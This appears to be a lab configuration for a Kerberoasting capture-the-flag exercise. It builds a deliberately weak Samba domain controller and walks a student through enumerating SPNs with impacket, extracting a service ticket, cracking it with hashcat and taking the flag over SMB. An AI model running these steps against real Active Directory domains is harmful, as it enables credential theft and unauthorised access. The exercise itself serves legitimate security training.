# yaml-language-server: $schema=https://www.isoloom.com/schema/v1.json
# Kerberoasting (GOAD-themed) as a single-container Isoloom lab: one Samba Active Directory
# Domain Controller for NORTH.SEVENKINGDOMS.LOCAL, no Windows VMs. It provisions a foothold
# user (hodor), a kerberoastable service account (svc_sql, with an MSSQL SPN and a weak RC4
# key), and a vault share only svc_sql may read. The student roasts svc_sql from the attack
# box, cracks the TGS, and reads the flag. `isoloom generate`, then `isothrum up . --target docker`.
version: 1

name: kerberoast-north

# Given by the CyberCTF launcher: this player's flag. Without it the development flag.
inputs: [CTF_FLAG_MAIN]

networks:
  lab: { cidr: 10.61.12.0/24, internet: false }

machines:
  dc:
    networks: { lab: 10 }
    aliases: [dc.north.sevenkingdoms.local, north.sevenkingdoms.local]
    resources: { cpus: 4, memory_mb: 3072 }
    ports:
      dns:         { port: 53,   protocol: tcp }
      dns-udp:     { port: 53,   protocol: udp }
      kerberos:    { port: 88,   protocol: tcp }
      kerberos-udp: { port: 88,  protocol: udp }
      ldap:        { port: 389,  protocol: tcp }
      smb:         { port: 445,  protocol: tcp }
      kpasswd:     { port: 464,  protocol: tcp }
      kpasswd-udp: { port: 464,  protocol: udp }
      ldaps:       { port: 636,  protocol: tls }
      gc:          { port: 3268, protocol: tcp }
    # The flag arrives as a file before the DC starts (Isoloom's sensitive-input mechanism);
    # provisioning copies it into the vault that only svc_sql may read.
    files:
      - { path: /ctf/flag, input: CTF_FLAG_MAIN, mode: "0444" }
    app:
      build: build/dc

checks:
  - { name: the KDC answers, tcp: dc:88, wait: 120 }
  - { name: LDAP answers, tcp: dc:389, wait: 120 }
  - { name: SMB answers, tcp: dc:445, wait: 120 }
  # End-to-end kerberoast, driven from inside the DC: hodor's TGS for svc_sql's SPN is
  # requested, cracked (hashcat 13100) to the weak password, and that password reads the flag.
  # Passes only when the DC is genuinely roastable; the heavy step is gated behind the ports.
  - name: kerberoasting svc_sql recovers its password and unlocks the flag
    from: dc
    exec: /opt/kerberoast/check.sh
    expect: KERBEROAST_OK
    wait: 180

message: |
  # Kerberoasting — NORTH.SEVENKINGDOMS.LOCAL

  A lone Active Directory Domain Controller (Samba) runs the realm **NORTH.SEVENKINGDOMS.LOCAL**:

  - **DC:** `dc.north.sevenkingdoms.local` at `{{ machines.dc.addresses.lab }}` (KDC 88, LDAP 389, SMB 445).
  - **Your foothold (a normal domain user):** `hodor` / `Hodor123!`

  **Objective:** a service account is registered with a Service Principal Name, so any domain
  user can request a Kerberos service ticket for it. The ticket is encrypted with the service
  account's key — if that key is a weak password, you can crack it offline. Recover the service
  account's password and use it to read the flag from a share you are not allowed into as `hodor`.

  Point your attack box's resolver and `/etc/krb5.conf` at the DC, then:

  1. **Find the roastable account (impacket):**
     `GetUserSPNs.py -dc-ip {{ machines.dc.addresses.lab }} NORTH.SEVENKINGDOMS.LOCAL/hodor:'Hodor123!'`
     → `svc_sql`, SPN `MSSQLSvc/dc.north.sevenkingdoms.local:1433`.
  2. **Request and extract the TGS (native Kerberos — reliable against a Samba KDC):**
     `kinit hodor` → `kvno MSSQLSvc/dc.north.sevenkingdoms.local:1433`, then pull the
     `$krb5tgs$23$...` hash out of your credential cache.
  3. **Crack it:** `hashcat -m 13100 tgs.hash rockyou.txt` (the password is a weak season+year word).
  4. **Loot the flag:** `smbclient //dc/vault -U 'NORTH\svc_sql%<cracked>' -c 'get flag.txt'`.

  Submit the contents of `flag.txt`.
